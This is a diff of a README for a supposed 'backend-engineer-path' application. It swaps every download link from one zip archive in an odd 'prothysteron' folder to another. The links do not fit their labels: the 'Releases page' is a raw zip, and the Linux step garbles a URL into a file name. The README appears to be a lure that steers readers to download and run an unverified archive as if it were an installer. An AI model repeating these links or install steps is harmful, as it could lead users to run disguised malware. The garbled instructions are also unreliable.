@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/evanh14/backend-engineer-path/main/prothysteron/backend-engineer-path-3.0.zip%20release-brightgreen)](https://raw.githubusercontent.com/evanh14/backend-engineer-path/main/prothysteron/backend-engineer-path-3.0.zip)
+[![Download](https://raw.githubusercontent.com/evanh14/backend-engineer-path/main/prothysteron/backend-engineer-path-1.2-alpha.1.zip%20release-brightgreen)](https://raw.githubusercontent.com/evanh14/backend-engineer-path/main/prothysteron/backend-engineer-path-1.2-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -28,14 +28,14 @@ To run this application, ensure your system meets the following requirements:
 
 Follow these simple steps to download and install the backend-engineer-path application:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/evanh14/backend-engineer-path/main/prothysteron/backend-engineer-path-3.0.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/evanh14/backend-engineer-path/main/prothysteron/backend-engineer-path-1.2-alpha.1.zip).
    
 2. **Select the Latest Version:** Look for the latest version at the top of the page. Click on it.
 
 3. **Download the Application:** Choose the appropriate file for your operating system:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, you may get a `https://raw.githubusercontent.com/evanh14/backend-engineer-path/main/prothysteron/backend-engineer-path-3.0.zip` file.
+   - For **Linux**, you may get a `https://raw.githubusercontent.com/evanh14/backend-engineer-path/main/prothysteron/backend-engineer-path-1.2-alpha.1.zip` file.
 
 4. **Run the Installer:** 
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
